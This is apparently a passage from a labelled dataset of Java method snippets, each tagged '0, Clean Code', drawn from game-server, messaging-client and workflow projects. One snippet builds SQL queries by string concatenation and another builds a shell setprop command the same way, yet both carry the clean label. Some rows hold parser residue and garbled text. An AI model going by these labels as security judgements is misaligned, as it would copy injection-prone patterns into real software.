      String[] kv=tableOption.split(""="");
      if (kv.length != 2) {
        throw new IllegalArgumentException(""table option format error: "" + tableOptionString + "", it should be like `key1=value1,key2=value2`."");
      }
      options.put(kv[0].trim(),kv[1].trim());
    }
  }
}",0,Clean Code
"public GProVoiceSmobaGameSmobaRoomInfo getSmobaInfo(){
  return this.smobaInfo;
}
",0,Clean Code
"@Override public int compareTo(@SuppressWarnings(""NullableProblems"") Identifier other){
  return alphanumericId != null ? other.alphanumericId != null ? alphanumericId.compareTo(other.alphanumericId) : 1 : other.alphanumericId != null ? -1 : Long.compare(numericId,other.numericId);
}",0,Clean Code
"/** 
 * <code>optional uint32 wave_id = 9;</code>
 * @param value the waveId to set
 * @return this
 */
public SceneMonsterWave setWaveId(final int value){
  bitField0_|=0x00000001;
  waveId=value;
  return this;
}",0,Clean Code
"public StartWorkflow(ObjectMapper objectMapper,Validator validator,StartWorkflowOperation startWorkflowOperation){
  super(TASK_TYPE_START_WORKFLOW);
  this.objectMapper=objectMapper;
  this.validator=validator;
  this.startWorkflowOperation=startWorkflowOperation;
}
private String startWorkflow(StartWorkflowRequest request,String workflowId){
  StartWorkflowInput input=new StartWorkflowInput(request);
  input.setTriggeringWorkflowId(workflowId);
  return startWorkflowOperation.execute(input);
}
",0,Clean Code
"private ExchangeHcoinCsReq(){
}
",0,Clean Code
"@Override public List<Message> pollMessages(String queueName,int count,int timeout){
  if (timeout < 1) {
    List<Message> messages=getWithTransactionWithOutErrorPropagation(tx -> popMessages(tx,queueName,count,timeout));
    if (messages == null) {
      return new ArrayList<>();
    }
    return messages;
  }
  long start=System.currentTimeMillis();
  final List<Message> messages=new ArrayList<>();
  while (true) {
    List<Message> messagesSlice=getWithTransactionWithOutErrorPropagation(tx -> popMessages(tx,queueName,count - messages.size(),timeout));
    if (messagesSlice == null) {
      logger.warn(""Unable to poll {} messages from {} due to tx conflict, only {} popped"",count,queueName,messages.size());
      return messages;
    }
    messages.addAll(messagesSlice);
    if (messages.size() >= count || ((System.currentTimeMillis() - start) > timeout)) {
      return messages;
    }
    Uninterruptibles.sleepUninterruptibly(100,TimeUnit.MILLISECONDS);
  }
}",0,Clean Code
"@Override public boolean onPreferenceChange(@NonNull Preference preference,Object o){
  String key="""";
  if (preference == mHome) {
    key=""home"";
  }
 else   if (preference == mSettings) {
    key=""settings"";
  }
 else   if (preference == mSystemUi) {
    key=""systemui"";
  }
 else   if (preference == mSecurityCenter) {
    key=""center"";
  }
 else   if (preference == mDemo) {
    key=""demo"";
  }
  if (!key.isEmpty()) {
    String mPkgList=getProp(""persist.hyperceiler.crash.report"");
    if ((boolean)o) {
      if (mPkgList.isEmpty()) {
        mPkgList=key;
      }
 else {
        mPkgList+="","" + key;
      }
    }
 else {
      mPkgList=mPkgList.replace("","" + key,"""").replace(key,"""");
    }
    ShellInit.getShell().run(""setprop persist.hyperceiler.crash.report \"""" + mPkgList + ""\"""").sync();
  }
  return true;
}
",0,Clean Code
"/** 
 * <code>repeated .DisplayAvatarDetailInfo assist_avatar_list = 425;</code>
 * @param value the assistAvatarList to add
 * @return this
 */
public PlayerDetailInfo addAssistAvatarList(final DisplayAvatarDetailInfoOuterClass.DisplayAvatarDetailInfo value){
  bitField0_|=0x00000800;
  assistAvatarList.add(value);
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 unique_id = 2;</code>
 * @param value the uniqueId to set
 * @return this
 */
public Item setUniqueId(final int value){
  bitField0_|=0x00000001;
  uniqueId=value;
  return this;
}",0,Clean Code
"void cacheToken(String str,int i2,int i3,byte[] bArr);",0,Clean Code
"public Set<FilePermission> permissions(){
  int bits=(st_mode & UnixConstants.S_IAMB);
  HashSet<FilePermission> perms=new HashSet<>();
  if ((bits & UnixConstants.S_IRUSR) > 0)   perms.add(FilePermission.OWNER_READ);
  if ((bits & UnixConstants.S_IWUSR) > 0)   perms.add(FilePermission.OWNER_WRITE);
  if ((bits & UnixConstants.S_IXUSR) > 0)   perms.add(FilePermission.OWNER_EXECUTE);
  if ((bits & UnixConstants.S_IRGRP) > 0)   perms.add(FilePermission.GROUP_READ);
  if ((bits & UnixConstants.S_IWGRP) > 0)   perms.add(FilePermission.GROUP_WRITE);
  if ((bits & UnixConstants.S_IXGRP) > 0)   perms.add(FilePermission.GROUP_EXECUTE);
  if ((bits & UnixConstants.S_IROTH) > 0)   perms.add(FilePermission.OTHERS_READ);
  if ((bits & UnixConstants.S_IWOTH) > 0)   perms.add(FilePermission.OTHERS_WRITE);
  if ((bits & UnixConstants.S_IXOTH) > 0)   perms.add(FilePermission.OTHERS_EXECUTE);
  return perms;
}",0,Clean Code
"@Override public void nodeLeft(final CombinedDiffNode node){
}
",0,Clean Code
"@Test public void genCode(){
  new RowEncoderBuilder(Foo.class).genCode();
  new RowEncoderBuilder(BeanA.class).genCode();
  new RowEncoderBuilder(BeanB.class).genCode();
}
",0,Clean Code
"public static String formatRelativeTimestampAsMinutesAgo(Context context,Instant instant,boolean relativeHours){
  long t=instant.toEpochMilli();
  long diff=System.currentTimeMillis() - t;
  if (diff < 1000L && diff > -1000L) {
    return context.getString(R.string.time_just_now);
  }
 else   if (diff > 0) {
    if (diff < 60_000L) {
      int secs=(int)(diff / 1000L);
      return context.getResources().getQuantityString(R.plurals.x_seconds_ago,secs,secs);
    }
 else     if (diff < 3600_000L) {
      int mins=(int)(diff / 60_000L);
      return context.getResources().getQuantityString(R.plurals.x_minutes_ago,mins,mins);
    }
 else     if (relativeHours && diff < 24 * 3600_000L) {
      int hours=(int)(diff / 3600_000L);
      return context.getResources().getQuantityString(R.plurals.x_hours_ago,hours,hours);
    }
  }
 else {
    if (diff > -60_000L) {
      int secs=-(int)(diff / 1000L);
      return context.getResources().getQuantityString(R.plurals.in_x_seconds,secs,secs);
    }
 else     if (diff > -3600_000L) {
      int mins=-(int)(diff / 60_000L);
      return context.getResources().getQuantityString(R.plurals.in_x_minutes,mins,mins);
    }
 else     if (relativeHours && diff > -24 * 3600_000L) {
      int hours=-(int)(diff / 3600_000L);
      return context.getResources().getQuantityString(R.plurals.in_x_hours,hours,hours);
    }
  }
  ZonedDateTime dt=instant.atZone(ZoneId.systemDefault());
  ZonedDateTime now=ZonedDateTime.now();
  String formattedTime=TIME_FORMATTER.format(dt);
  String formattedDate;
  LocalDate today=now.toLocalDate();
  LocalDate date=dt.toLocalDate();
  if (date.equals(today)) {
    formattedDate=context.getString(R.string.today);
  }
 else   if (date.equals(today.minusDays(1))) {
    formattedDate=context.getString(R.string.yesterday);
  }
 else   if (date.equals(today.plusDays(1))) {
    formattedDate=context.getString(R.string.tomorrow);
  }
 else   if (date.getYear() == today.getYear()) {
    formattedDate=DATE_FORMATTER_SHORT.format(dt);
  }
 else {
    formattedDate=DATE_FORMATTER_SHORT_WITH_YEAR.format(dt);
  }
  return context.getString(R.string.date_at_time,formattedDate,formattedTime);
}",0,Clean Code
"public SearchResultsCellRenderer(){
  setOpaque(true);
}
",0,Clean Code
"public List<GameItem> composeRelic(Player player,int composeId,int relicId,int mainAffix,int count){
  if (count <= 0)   return null;
  ItemComposeExcel excel=GameData.getItemComposeExcelMap().get(composeId);
  if (excel == null || excel.getFormulaType() != FormulaType.SelectedRelic) {
    return null;
  }
  if (excel.getRelicList() == null || !excel.getRelicList().contains(relicId)) {
    return null;
  }
  ItemExcel itemExcel=GameData.getItemExcelMap().get(relicId);
  if (itemExcel == null)   return null;
  List<ItemParam> costItems=new ArrayList<>();
  costItems.addAll(excel.getMaterialCost());
  if (mainAffix > 0) {
    for (    int specialId : excel.getSpecialMaterialCost()) {
      costItems.add(new ItemParam(specialId,1));
    }
  }
  if (!player.getInventory().verifyItems(costItems,count) || !player.getInventory().verifyScoin(excel.getCoinCost() * count)) {
    return null;
  }
  player.getInventory().removeItemsByParams(costItems,count);
  player.addSCoin(-excel.getCoinCost() * count);
  List<GameItem> items=new ArrayList<>();
  for (int i=0; i < count; i++) {
    GameItem item=new GameItem(itemExcel,1,mainAffix);
    items.add(item);
  }
  player.getInventory().addItems(items);
  return items;
}",0,Clean Code
"String formatValuesAsString(Collection<?> values){
  return ""("" + values.stream().map(v -> String.format(""'%s'"",v)).collect(Collectors.joining("","")) + "")"";
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code RogueAeonInfo}
 */
public static RogueAeonInfo newInstance(){
  return new RogueAeonInfo();
}
",0,Clean Code
"private MECNPEEJJDE(){
}
",0,Clean Code
"@ParameterizedTest @ValueSource(strings={""{\""arg0\"": 2, \""arg1\"": 2}"",""{\""arg0\"": 2.0, \""arg1\"": 2.0}""}) void should_execute_tool_with_parameters_of_type_long(String arguments) throws NoSuchMethodException {
  executeAndAssert(arguments,""longs"",long.class,Long.class,""4"");
}",0,Clean Code
"public static String getLanguage(Context context){
  Resources resources=context.getResources();
  String country=resources.getConfiguration().getLocales().get(0).getCountry();
  if (country.isEmpty()) {
    return resources.getConfiguration().getLocales().get(0).getLanguage();
  }
  return resources.getConfiguration().getLocales().get(0).getLanguage() + ""_"" + country;
}",0,Clean Code
"/** 
 * <code>optional uint64 taken_premium_reward1 = 10;</code>
 * @return the takenPremiumReward1
 */
public long getTakenPremiumReward1(){
  return takenPremiumReward1;
}",0,Clean Code
"@Override public void onClick(View v){
  GroupCreateSpan span=(GroupCreateSpan)v;
  if (span.isDeleting()) {
    currentDeletingSpan=null;
    spansContainer.removeSpan(span);
    if (span.getUid() == Integer.MIN_VALUE) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CONTACTS;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 1) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_NON_CONTACTS;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 2) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_GROUPS;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 3) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CHANNELS;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 4) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_BOTS;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 5) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_MUTED;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 6) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_READ;
    }
 else     if (span.getUid() == Integer.MIN_VALUE + 7) {
      filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_ARCHIVED;
    }
    updateHint();
    checkVisibleRows();
  }
 else {
    if (currentDeletingSpan != null) {
      currentDeletingSpan.cancelDeleteAnimation();
    }
    currentDeletingSpan=span;
    span.startDeleteAnimation();
  }
}",0,Clean Code
"public String getSampleText(){
  return this.sampleText;
}
",0,Clean Code
"/** 
 * <code>optional uint32 head_icon = 6;</code>
 * @param value the headIcon to set
 * @return this
 */
public PlayerDetailInfo setHeadIcon(final int value){
  bitField0_|=0x00000002;
  headIcon=value;
  return this;
}",0,Clean Code
"@Override public ChessRogueMoneyInfo mergeFrom(final ChessRogueMoneyInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasMoney()) {
    setMoney(other.money);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7a139c99!org.eclipse.jdt.core.dom.MethodDeclaration@37a723cb",0,Clean Code
"public static Set<String> getClassSet(String packageName){
  Set<String> classSet=new HashSet<>();
  try {
    Enumeration<URL> urls=loader.getResources(packageName.replace(""."",""/""));
    while (urls.hasMoreElements()) {
      URL url=urls.nextElement();
      if (url != null) {
        String protocol=url.getProtocol();
        if (protocol.equals(""jar"")) {
          JarURLConnection jarURLConnection=(JarURLConnection)url.openConnection();
          if (jarURLConnection != null) {
            JarFile jarFile=jarURLConnection.getJarFile();
            if (jarFile != null) {
              Enumeration<JarEntry> jarEntries=jarFile.entries();
              while (jarEntries.hasMoreElements()) {
                JarEntry jarEntry=jarEntries.nextElement();
                String jarEntryName=jarEntry.getName();
                if (jarEntryName.endsWith("".class"")) {
                  String className=jarEntryName.substring(0,jarEntryName.lastIndexOf(""."")).replaceAll(""/"",""."");
                  if (!className.contains(""$"") && className.startsWith(packageName)) {
                    classSet.add(className);
                  }
                }
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception ignored) {
  }
  return classSet;
}",0,Clean Code
"@Override public Long hlen(String key){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.hlen(key);
  }
 }
",0,Clean Code
"BigDecimal queryBeforeTaxTotalSalary(@Param(""employeeId"") Integer employeeId,@Param(""year"") Integer year,@Param(""month"") Integer month);
",0,Clean Code
"private FMMultiLabelModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FMMultiLabelModelProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@49fa0d5a",0,Clean Code
"@Override public ItemCost clone(){
  return new ItemCost().copyFrom(this);
}
",0,Clean Code
"@Override public String getFeedId(){
  return this.mInfo.getFeedId();
}
",0,Clean Code
"@Override public <T extends Annotation>T getAnnotation(Class<T> annotationClass){
  return null;
}
",0,Clean Code
"public GroupBulletin(){
  this.feedsRecords=new ArrayList<>();
}
public GroupBulletin(long j2,ArrayList<BulletinFeedsRecord> arrayList,int i2,int i3){
  this.feedsRecords=new ArrayList<>();
  this.groupCode=j2;
  this.feedsRecords=arrayList;
  this.lastModifyTime=i2;
  this.unreadNum=i3;
}",0,Clean Code
"@Override public Long lpush(String key,String... string){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.lpush(key,string);
  }
 }
",0,Clean Code
"private void findList(CharSequence constraint,String str,ArrayList<ModData> nlist){
  for (  ModData filterableData : SearchHelper.allModsList) {
    if (constraint.toString().equals(SearchHelper.NEW_MODS_SEARCH_QUERY)) {
      if (SearchHelper.NEW_MODS.contains(filterableData.key)) {
        if (check(filterableData.key)) {
          nlist.add(filterableData);
          modMap.put(filterableData.key,0);
        }
      }
    }
 else     if (filterableData.title.toLowerCase().contains(str)) {
      if (check(filterableData.key)) {
        nlist.add(filterableData);
        modMap.put(filterableData.key,0);
      }
    }
  }
}",0,Clean Code
"@TruffleBoundary public Object getLastOrNull(){
  if (elementOrder.isEmpty())   return VmNull.withoutDefault();
  return elementOrder.get(elementOrder.size() - 1);
}",0,Clean Code
"boolean getEnableStream();
",0,Clean Code
"public long getSrcGuildId(){
  return this.srcGuildId;
}
",0,Clean Code
"/** 
 * <code>repeated .AvatarSkillTree skilltree_list = 6;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSkilltreeList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<AvatarSkillTreeOuterClass.AvatarSkillTree> getSkilltreeList(){
  return skilltreeList;
}",0,Clean Code
"public static Object translator(Object value,DataType dataType){
  try {
    if (dataType instanceof DateTimeType) {
      return ((DateTimeType)dataType).convert(value);
    }
 else     if (dataType instanceof DoubleType) {
      return ((DoubleType)dataType).convert(value);
    }
 else     if (dataType instanceof FloatType) {
      return ((FloatType)dataType).convert(value);
    }
 else     if (dataType instanceof LongType) {
      return ((LongType)dataType).convert(value);
    }
 else     if (dataType instanceof BooleanType) {
      return ((BooleanType)dataType).convert(value);
    }
 else     if (dataType instanceof IntType) {
      return ((IntType)dataType).convert(value);
    }
 else     if (dataType instanceof ObjectType) {
      return propertyMetadataTranslator(value,((ObjectType)dataType).getProperties());
    }
 else {
      return value;
    }
  }
 catch (  Exception e) {
    log.error(""璁惧涓婃姤鍊间笌鍏冩暟鎹�间笉鍖归厤.value:{},DataTypeClass:{}"",value,dataType.getClass(),e);
    return value;
  }
}
",0,Clean Code
"protected ChartData(){
}
public ChartData(JSONObject jsonObject) throws JSONException {
  JSONArray columns=jsonObject.getJSONArray(""columns"");
  int n=columns.length();
  for (int i=0; i < columns.length(); i++) {
    JSONArray a=columns.getJSONArray(i);
    if (a.getString(0).equals(""x"")) {
      int len=a.length() - 1;
      x=new long[len];
      for (int j=0; j < len; j++) {
        x[j]=a.getLong(j + 1);
      }
    }
 else {
      Line l=new Line();
      lines.add(l);
      int len=a.length() - 1;
      l.id=a.getString(0);
      l.y=new long[len];
      for (int j=0; j < len; j++) {
        l.y[j]=a.getLong(j + 1);
        if (l.y[j] > l.maxValue)         l.maxValue=l.y[j];
        if (l.y[j] < l.minValue)         l.minValue=l.y[j];
      }
    }
    if (x.length > 1) {
      timeStep=x[1] - x[0];
    }
 else {
      timeStep=86400000L;
    }
    measure();
  }
  JSONObject colors=jsonObject.optJSONObject(""colors"");
  JSONObject names=jsonObject.optJSONObject(""names"");
  try {
    xTickFormatter=getFormatter(jsonObject.getString(""xTickFormatter""));
    yTickFormatter=getFormatter(jsonObject.getString(""yTickFormatter""));
    xTooltipFormatter=getFormatter(jsonObject.getString(""xTooltipFormatter""));
    yTooltipFormatter=getFormatter(jsonObject.getString(""yTooltipFormatter""));
  }
 catch (  Exception ignore) {
  }
  Pattern colorPattern=Pattern.compile(""(.*)(#.*)"");
  for (int i=0; i < lines.size(); i++) {
    ChartData.Line line=lines.get(i);
    if (colors != null) {
      Matcher matcher=colorPattern.matcher(colors.getString(line.id));
      if (matcher.matches()) {
        String key=matcher.group(1);
        if (!TextUtils.isEmpty(key)) {
          line.colorKey=ThemeColors.stringKeyToInt(""statisticChartLine_"" + matcher.group(1).toLowerCase());
        }
        line.color=Color.parseColor(matcher.group(2));
        line.colorDark=ColorUtils.blendARGB(Color.WHITE,line.color,0.85f);
      }
    }
    if (names != null) {
      line.name=names.getString(line.id);
    }
  }
}",0,Clean Code
"public void setFilePath(String str){
  this.filePath=str;
}
",0,Clean Code
"private static boolean isNameStart(int c){
  return (c < 0x10000 && (CHARS[c] & MASK_NAME_START) != 0) || (0x10000 <= c && c < 0xF0000);
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof ReEnterLastElementStageScRsp)) {
    return false;
  }
  ReEnterLastElementStageScRsp other=(ReEnterLastElementStageScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasStageId() || stageId == other.stageId) && (!hasRetcode() || retcode == other.retcode) && (!hasBattleInfo() || battleInfo.equals(other.battleInfo));
}",0,Clean Code
"public static void addToPulledDialogs(BaseFragment thisFragment,int stackIndex,TLRPC.Chat chat,TLRPC.User user,long dialogId,int folderId,int filterId){
  if (chat == null && user == null) {
    return;
  }
  if (thisFragment == null) {
    return;
  }
  INavigationLayout parentLayout=thisFragment.getParentLayout();
  if (parentLayout == null) {
    return;
  }
  if (parentLayout.getPulledDialogs() == null) {
    parentLayout.setPulledDialogs(new ArrayList<>());
  }
  boolean alreadyAdded=false;
  for (  PulledDialog d : parentLayout.getPulledDialogs()) {
    if (d.dialogId == dialogId) {
      alreadyAdded=true;
      break;
    }
  }
  if (!alreadyAdded) {
    PulledDialog d=new PulledDialog();
    d.activity=ChatActivity.class;
    d.stackIndex=stackIndex;
    d.dialogId=dialogId;
    d.filterId=filterId;
    d.folderId=folderId;
    d.chat=chat;
    d.user=user;
    parentLayout.getPulledDialogs().add(d);
  }
}
",0,Clean Code
"@Override public GetRollShopInfoCsReq clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"@AtEnter public static void atEnter(@Binding.Class Class<?> clazz,@Binding.This Object target,@Binding.MethodName String methodName,@Binding.MethodDesc String methodDesc,@Binding.Args Object[] args){
  Bridge.atEnter(clazz,target,methodName,methodDesc,args);
}
",0,Clean Code
"private void selectSettingGroup(int position,boolean focus){
  if (!isCurrentLiveChannelValid())   return;
  if (focus) {
    liveSettingGroupAdapter.setFocusedGroupIndex(position);
    liveSettingItemAdapter.setFocusedItemIndex(-1);
  }
  if (position == liveSettingGroupAdapter.getSelectedGroupIndex() || position < -1)   return;
  liveSettingGroupAdapter.setSelectedGroupIndex(position);
  liveSettingItemAdapter.setNewData(liveSettingGroupList.get(position).getLiveSettingItems());
switch (position) {
case 0:
    liveSettingItemAdapter.selectItem(currentLiveChannelItem.getSourceIndex(),true,false);
  break;
case 1:
liveSettingItemAdapter.selectItem(livePlayerManager.getLivePlayerScale(),true,true);
break;
case 2:
liveSettingItemAdapter.selectItem(livePlayerManager.getLivePlayerType(),true,true);
break;
}
int scrollToPosition=liveSettingItemAdapter.getSelectedItemIndex();
if (scrollToPosition < 0) scrollToPosition=0;
mSettingItemView.scrollToPosition(scrollToPosition);
mHandler.removeCallbacks(mHideSettingLayoutRun);
mHandler.postDelayed(mHideSettingLayoutRun,5000);
}",0,Clean Code
"private <T>T fromJson(String json,Class<T> targetClass){
  try {
    return this.objectMapper.readValue(json,targetClass);
  }
 catch (  JsonProcessingException e) {
    throw new RuntimeException(e);
  }
}
",0,Clean Code
"@Override public boolean mouseReleased(double mouseX,double mouseY,int button){
  double s=mc.getWindow().getScaleFactor();
  mouseX*=s;
  mouseY*=s;
  if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT)   pressed=false;
  if (addedHoveredToSelectionWhenClickedElement != null) {
    selection.remove(addedHoveredToSelectionWhenClickedElement);
    addedHoveredToSelectionWhenClickedElement=null;
  }
  if (moved) {
    if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT && !dragging)     fillSelection((int)mouseX,(int)mouseY);
  }
 else {
    if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT) {
      HudElement hovered=getHovered((int)mouseX,(int)mouseY);
      if (hovered != null)       hovered.toggle();
    }
 else     if (button == GLFW.GLFW_MOUSE_BUTTON_RIGHT) {
      HudElement hovered=getHovered((int)mouseX,(int)mouseY);
      if (hovered != null)       mc.setScreen(new HudElementScreen(theme,hovered));
 else       mc.setScreen(new AddHudElementScreen(theme,lastMouseX,lastMouseY));
    }
  }
  if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT) {
    snapper.unsnap();
    moved=dragging=false;
  }
  return false;
}
",0,Clean Code
"public static void checkIsInstantiable(VmClass parentClass,@Nullable Node parentNode){
  if (parentClass.isInstantiable())   return;
  CompilerDirectives.transferToInterpreter();
  if (parentClass.isAbstract()) {
    throw new VmExceptionBuilder().evalError(""cannotInstantiateAbstractClass"",parentClass).withOptionalLocation(parentNode).build();
  }
  assert parentClass.isExternal();
  throw new VmExceptionBuilder().evalError(""cannotInstantiateExternalClass"",parentClass).withOptionalLocation(parentNode).build();
}
",0,Clean Code
"@Override public void onItemClick(int id){
  if (id == -1) {
    finishFragment();
  }
 else   if (id == done_button) {
    if (getParentActivity() == null) {
      return;
    }
    if (StrUtil.isBlank(ipField.getText())) {
      ipField.requestFocus();
      AndroidUtilities.showKeyboard(ipField);
      return;
    }
    if (StrUtil.isBlank(portField.getText())) {
      portField.requestFocus();
      AndroidUtilities.showKeyboard(portField);
      return;
    }
    if (StrUtil.isBlank(userIdField.getText())) {
      userIdField.requestFocus();
      AndroidUtilities.showKeyboard(userIdField);
      return;
    }
    if (StrUtil.isBlank(alterIdField.getText())) {
      alterIdField.requestFocus();
      AndroidUtilities.showKeyboard(alterIdField);
      return;
    }
    currentBean.setAddress(ipField.getText().toString());
    currentBean.setPort(Utilities.parseInt(portField.getText().toString()));
    currentBean.setId(userIdField.getText().toString());
    currentBean.setAlterId(Utilities.parseInt(alterIdField.getText().toString()));
    currentBean.setSecurity(securityField.getValueTextView().getText().toString());
    currentBean.setNetwork(networkField.getValueTextView().getText().toString());
    currentBean.setHeaderType(headTypeField.getValueTextView().getText().toString());
    currentBean.setRequestHost(requestHostField.getText().toString());
    currentBean.setPath(pathField.getText().toString());
    currentBean.setStreamSecurity(useTlsField.isChecked() ? ""tls"" : """");
    currentBean.setRemarks(remarksField.getText().toString());
    if (currentProxyInfo == null) {
      currentProxyInfo=new SharedConfig.VmessProxy(currentBean);
      SharedConfig.addProxy(currentProxyInfo);
      SharedConfig.setCurrentProxy(currentProxyInfo);
    }
 else {
      currentProxyInfo.proxyCheckPingId=0;
      currentProxyInfo.availableCheckTime=0;
      currentProxyInfo.ping=0;
      SharedConfig.saveProxyList();
      SharedConfig.setProxyEnable(false);
    }
    finishFragment();
  }
}",0,Clean Code
"public PacketBattlePassInfoNotify(){
  super(CmdId.BattlePassInfoNotify);
  var data=BattlePassInfoNotify.newInstance().setTakenFreeReward(0xFFFFFFFFFFFFFFFFL).setTakenPremiumReward1(0xFFFFFFFFFFFFFFFFL).setTakenPremiumReward2(0x7FFFFFFFFFFFEL).setTakenPremiumOptionalReward(0x7FFFFFFFFFFFEL).setTakenFreeExtendedReward(127).setTakenPremiumExtendedReward(127).setLevel(70).setCurWeekAddExpSum(8000).setExp(800).setCurBpId(5).setBpTierType(BpTierType.BP_TIER_TYPE_PREMIUM_2);
  this.setData(data);
}",0,Clean Code
"public String getQueryCondition(){
  StringBuilder sb=new StringBuilder();
  if (!StringUtils.isEmpty(taskId)) {
    sb.append(""task_id = '"").append(taskId).append(""'"").append(LINK);
  }
  if (!CollectionUtils.isEmpty(taskIds)) {
    String taskIdsInQuery=taskIds.stream().map(id -> String.format(""'%s'"",id)).collect(Collectors.joining("", ""));
    sb.append(""task_id in ("").append(taskIdsInQuery).append("")"").append(LINK);
  }
  if (subInstanceId != null) {
    sb.append(""sub_instance_id = "").append(subInstanceId).append(LINK);
  }
  if (instanceId != null) {
    sb.append(""instance_id = "").append(instanceId).append(LINK);
  }
  if (!StringUtils.isEmpty(address)) {
    sb.append(""address = '"").append(address).append(""'"").append(LINK);
  }
  if (!StringUtils.isEmpty(taskName)) {
    sb.append(""task_name = '"").append(taskName).append(""'"").append(LINK);
  }
  if (status != null) {
    sb.append(""status = "").append(status).append(LINK);
  }
  if (StringUtils.isNotEmpty(fullCustomQueryCondition)) {
    sb.append(fullCustomQueryCondition);
    return sb.toString();
  }
  if (!StringUtils.isEmpty(queryCondition)) {
    sb.append(queryCondition).append(LINK);
  }
  String substring=sb.substring(0,sb.length() - LINK.length());
  if (!StringUtils.isEmpty(otherCondition)) {
    substring+=otherCondition;
  }
  if (limit != null) {
    substring=substring + "" limit "" + limit;
  }
  return substring;
}",0,Clean Code
"@Override public String toString(){
  return ""StatusNumVO{"" + ""label='"" + label + '\''+ "", status=""+ status+ "", count=""+ count+ '}';
}
",0,Clean Code
"@Test public void testRetryWorkflowMultipleRetries(){
  WorkflowModel workflow=new WorkflowModel();
  workflow.setWorkflowId(""testRetryWorkflowId"");
  WorkflowDef workflowDef=new WorkflowDef();
  workflowDef.setName(""testRetryWorkflowId"");
  workflowDef.setVersion(1);
  workflow.setWorkflowDefinition(workflowDef);
  workflow.setOwnerApp(""junit_testRetryWorkflowId"");
  workflow.setCreateTime(10L);
  workflow.setEndTime(100L);
  workflow.setOutput(Collections.EMPTY_MAP);
  workflow.setStatus(WorkflowModel.Status.FAILED);
  TaskModel task_1_1=new TaskModel();
  task_1_1.setTaskId(UUID.randomUUID().toString());
  task_1_1.setSeq(10);
  task_1_1.setRetryCount(0);
  task_1_1.setTaskType(TaskType.SIMPLE.toString());
  task_1_1.setStatus(TaskModel.Status.FAILED);
  task_1_1.setTaskDefName(""task1"");
  task_1_1.setWorkflowTask(new WorkflowTask());
  task_1_1.setReferenceTaskName(""task1_ref1"");
  TaskModel task_2_1=new TaskModel();
  task_2_1.setTaskId(UUID.randomUUID().toString());
  task_2_1.setSeq(20);
  task_2_1.setRetryCount(0);
  task_2_1.setTaskType(TaskType.SIMPLE.toString());
  task_2_1.setStatus(TaskModel.Status.CANCELED);
  task_2_1.setTaskDefName(""task1"");
  task_2_1.setWorkflowTask(new WorkflowTask());
  task_2_1.setReferenceTaskName(""task2_ref1"");
  workflow.getTasks().addAll(Arrays.asList(task_1_1,task_2_1));
  when(executionDAOFacade.getWorkflowModel(anyString(),anyBoolean())).thenReturn(workflow);
  when(metadataDAO.getWorkflowDef(anyString(),anyInt())).thenReturn(Optional.of(new WorkflowDef()));
  workflowExecutor.retry(workflow.getWorkflowId(),false);
  assertEquals(4,workflow.getTasks().size());
  TaskModel lastTask=workflow.getTasks().stream().filter(t -> t.getReferenceTaskName().equals(""task1_ref1"")).collect(groupingBy(TaskModel::getReferenceTaskName,maxBy(comparingInt(TaskModel::getSeq)))).values().stream().map(Optional::get).collect(Collectors.toList()).get(0);
  lastTask.setStatus(TaskModel.Status.FAILED);
  workflow.setStatus(WorkflowModel.Status.FAILED);
  workflowExecutor.retry(workflow.getWorkflowId(),false);
  assertEquals(5,workflow.getTasks().size());
  TaskModel lastTask2=workflow.getTasks().stream().filter(t -> t.getReferenceTaskName().equals(""task1_ref1"")).collect(groupingBy(TaskModel::getReferenceTaskName,maxBy(comparingInt(TaskModel::getSeq)))).values().stream().map(Optional::get).collect(Collectors.toList()).get(0);
  lastTask2.setStatus(TaskModel.Status.FAILED);
  workflow.setStatus(WorkflowModel.Status.FAILED);
  workflowExecutor.retry(workflow.getWorkflowId(),false);
  assertEquals(6,workflow.getTasks().size());
}",0,Clean Code
"public static TaskResult inProgress(){
  return newTaskResult(Status.IN_PROGRESS);
}
",0,Clean Code
"public MongoDBVectorStoreConfig build(){
  return new MongoDBVectorStoreConfig(this);
}
",0,Clean Code
"@Override public Optional<Object> read(URI uri){
  assert uri.getScheme().equals(""env"");
  var context=VmContext.get(null);
  var value=context.getEnvironmentVariables().get(uri.getSchemeSpecificPart());
  return Optional.ofNullable(value);
}
",0,Clean Code
"public String getXmlContent(){
  return this.xmlContent;
}
",0,Clean Code
"@Override public boolean performAccessibilityAction(int action,Bundle arguments){
  if (super.performAccessibilityAction(action,arguments)) {
    return true;
  }
  final boolean pagesFlipped=isPageOrderFlipped();
switch (action) {
